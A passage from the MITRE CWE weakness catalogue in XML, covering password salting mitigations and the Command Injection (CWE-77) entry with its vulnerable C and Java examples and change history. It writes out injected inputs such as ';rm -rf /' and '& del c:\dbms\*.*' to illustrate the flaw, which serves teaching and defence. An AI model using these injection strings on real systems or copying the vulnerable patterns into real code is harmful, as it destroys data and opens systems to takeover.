               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-4905</Reference>
               <Description>Blogging software uses a hard-coded salt when calculating a password hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4905</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1657</Reference>
               <Description>Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1657</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0967</Reference>
               <Description>Server uses a constant salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-631"/>
            <Reference External_Reference_ID="REF-632"/>
            <Reference External_Reference_ID="REF-633"/>
            <Reference External_Reference_ID="REF-634"/>
            <Reference External_Reference_ID="REF-635"/>
            <Reference External_Reference_ID="REF-636"/>
            <Reference External_Reference_ID="REF-637"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Creating a Salted Hash&#34; Page 302"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Salt Values&#34;, Page 46"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-03-03</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, References, Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="77" Name="Improper Neutralization of Special Elements used in a Command ('Command Injection')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Command injection vulnerabilities typically occur when:</xhtml:p>
            <xhtml:div style="margin-left:1em;">
               <xhtml:div>1. Data enters the application from an untrusted source.</xhtml:div>
               <xhtml:div>2. The data is part of a string that is executed as a command by the application.</xhtml:div>
               <xhtml:div>3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</xhtml:div>
            </xhtml:div>
            <xhtml:p>Many protocols and products have their own custom command language. While OS or shell command strings are frequently discovered and targeted, developers may not realize that these other command languages might also be vulnerable to attacks.</xhtml:p>
            <xhtml:p>Command injection is a common problem with wrapper programs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If possible, ensure that all external commands called from the program are statically created.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Run time: Run time policy enforcement may be used in an allowlist fashion to prevent use of any non-sanctioned commands.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Assign permissions that prevent the user from accessing/opening privileged files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:1em;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:1em;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String home = System.getProperty("APPHOME");<xhtml:br/>String cmd = home + INITCMD;<xhtml:br/>java.lang.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#include &lt;stdio.h&gt;<xhtml:br/>#include &lt;unistd.h&gt;<xhtml:br/>
                     <xhtml:br/>int main(int argc, char **argv) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>char cat[] = "cat ";<xhtml:br/>char *command;<xhtml:br/>size_t commandLength;<xhtml:br/>
                           <xhtml:br/>commandLength = strlen(cat) + strlen(argv[1]) + 1;<xhtml:br/>command = (char *) malloc(commandLength);<xhtml:br/>strncpy(command, cat, commandLength);<xhtml:br/>strncat(command, argv[1], (commandLength - strlen(cat)) );<xhtml:br/>
                           <xhtml:br/>system(command);<xhtml:br/>return (0);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Used normally, the output is simply the contents of the file requested:</Body_Text>
               <Example_Code Nature="Informative">
                  <xhtml:div>$ ./catWrapper Story.txt<xhtml:br/>When last we left our heroes...</xhtml:div>
               </Example_Code>
               <Body_Text>However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>$ ./catWrapper Story.txt; ls<xhtml:br/>When last we left our heroes...<xhtml:br/>Story.txt<xhtml:br/>SensitiveFile.txt<xhtml:br/>PrivateData.db<xhtml:br/>a.out*</xhtml:div>
               </Example_Code>
               <Body_Text>If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-36069</Reference>
               <Description>Python-based dependency management tool avoids OS command injection  when generating Git commands but allows  injection of optional arguments with input beginning with a dash, potentially allowing for code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36069</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example of OS command injection. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-1509</Reference>
               <Description>injection of sed script syntax ("sed injection")</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-1509</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-41282</Reference>
               <Description>injection of sed script syntax ("sed injection")</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-41282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-13398</Reference>
               <Description>injection of sed script syntax ("sed injection")</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-13398</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-12921</Reference>
               <Description>image program allows injection of commands in "Magick Vector Graphics (MVG)" language.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-11698</Reference>
               <Description>anti-spam product allows injection of SNMP commands into confiuration file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11698</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Command injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS34-PL</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to a command interpreter</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="183"/>
            <Related_Attack_Pattern CAPEC_ID="248"/>
            <Related_Attack_Pattern CAPEC_ID="40"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Allowed-with-Review (this CWE ID could be used to map to real-world vulnerabilities in limited situations requiring careful review).</xhtml:p>
               <xhtml:p>Rationale: CWE-77 is often used when OS command injection (CWE-78) was intended instead [REF-1287].</xhtml:p>
               <xhtml:p>Comments: if the weakness involves a command language besides OS shell invocation, then CWE-77 could be used.</xhtml:p>
            </Note>
            <Note Type="Terminology">
               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
               <xhtml:p>Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
